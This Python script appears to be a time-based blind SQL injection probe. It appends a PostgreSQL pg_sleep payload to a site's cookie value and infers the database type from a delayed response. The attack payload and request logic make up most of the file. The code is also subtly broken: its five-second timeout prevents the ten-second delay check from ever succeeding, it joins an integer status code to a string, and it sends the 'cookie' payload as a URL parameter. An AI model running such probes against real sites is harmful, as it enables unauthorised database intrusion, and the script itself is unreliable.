import requests

URL = ''
COOKIE_NAME = ''
TIMEOUT = '5'
DATABASES = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']

def SQLi_test(url, cookie_name, timeout=5):
    initial_response = requests.get(url, timeout=timeout)
    cookie = initial_response.cookies[cookie_name]

    for database in DATABASES:
        payload = ''

        if database == 'PostgreSQL':
            payload = '\'%3B AND SELECT CASE WHEN(1 = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--'

        response = requests.get(url, params={cookie_name: cookie + payload}, timeout=timeout)

        if response.elapsed.total_seconds() >= 10:
            print(response.cookies[cookie_name])
            print('SQLi test was successful! The database is ' + database)
            return database
        else:
            print(f'SQLi test failed for cookie {cookie_name} assuming a {database} database.')
            print('Status code: ' + response.status_code)

if __name__ == '__main__':
    SQLi_test(URL, COOKIE_NAME, TIMEOUT)